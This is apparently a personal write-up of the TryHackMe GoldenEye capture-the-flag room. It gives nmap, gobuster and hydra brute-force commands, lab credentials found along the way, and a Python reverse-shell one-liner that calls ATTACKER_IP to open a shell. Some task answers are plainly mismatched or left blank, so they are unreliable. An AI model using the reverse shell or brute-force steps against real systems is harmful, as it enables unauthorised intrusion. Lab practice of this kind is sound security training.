---
cssclasses:
  - jbm-note
Date: 2026-05-26
---
# GoldenEye Challenge

| **Target**            | *Try hack me machine(room: goldeneye)* |
| --------------------- | -------------------------------------- |
| Date                  | 26/5/2026                              |
| Main attack type      | Lateral movement                       |
| Secondary attack type | Reverse shell                          |
| Tools:                | NMAP, GOBUSTER,HYDRA,                  |
| Criticality:          | **...**                                |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. How many ports are open?
	- *3*
2. Who needs to make sure to update their password?
	- *Boris*
3. What's their password?
	- *InvincibleHack3r*
### Task 2
1. What's their new password?
	- *...*
2. What service can you find on port *55007*?
	- *pop3*
3. What can you find on the service?
	- *...*
4. Who can break Boris' codes?
	- *Natalya*

### Task 3
1. What credentials you found earlier?
	- *xenia*
2. What other user can you find?
	- *doak*
3. What was this users password?
	- *goat*
4. What is the next user you can find from doak?
	- *dr_doak*
5. What is the password?
	- *4England!*

### Task 4
1. What's the kernel version?
	- *xenia*
2. What is the root flag?
	- *doak*

---
# Preparation
---
## Getting the PHP payload
...

---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
```bash
sudo nmap -sS -sV -p- 10.80.140.6 -oA nmap
```
```
Nmap scan report for 10.80.140.6
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
```

## GOBUSTER
```bash
gobuster dir -u http://10.80.140.8 -w /usr/share/wordlists/dirb/big.txt  -o endpoints.txt
```
```
No intresting results
```

## **Vulnerability scanning**
### Dictionary attacks
#### Hydra
```bash
hydra -l boris -P /usr/share/wordlists/rockyou.txt -s 55007 10.80.140.6 pop3 -f -V        
```

---
# Exploiting and  Investigation
---
## Boris
Exploring `terminal.js` found in the website on port 80, shows dialog (presumably from a coworker) that *Boris* needs to change their password. The dialog also shows an encoded password. This encoding seems to be an HTML character reference encoding, decoding it with html escape results in the text : `InvincibleHack3r`. This allows us to login to the `/sev-home/` endpoint.

## Natalya Boris
Logging in and inspecting the site shows the following comment:
```
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
```


## MAIL
Interacting with the email service (*pop3*), the credentials from the site don't work. This can be bypassed with `hydra` however.
```bash
hydra -l boris -P /usr/share/wordlists/rockyou.txt -s 55007 10.80.140.6 pop3 -f -V        
```
Password : `secret1!`

The mail service allows us to exfiltrate other users.

mariel
## Other users
```
USER: XENIA
PASSWORD: RCP90rulez!

USER: Natalya
PASSWORD: bird

USER: ALEC
PASSWORD: ....

USER: ADMIN)
PASSWORD: xWinter1995x!

USER: DOAK
PASSWORD: goat

USER: DR_DOAK
PASSWORD: 4England!
```
## Going through the system
After getting the credentials of several users, lateral movement can be performed easily to get the account of *dr_doak* and check his email to find the credentials of the admin account hidden in an image found in the `/dir007key/for-007.jpg`.

Afterward the spellchecker plugin can be exploited to create a reverse shell.

Payload:
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Root access
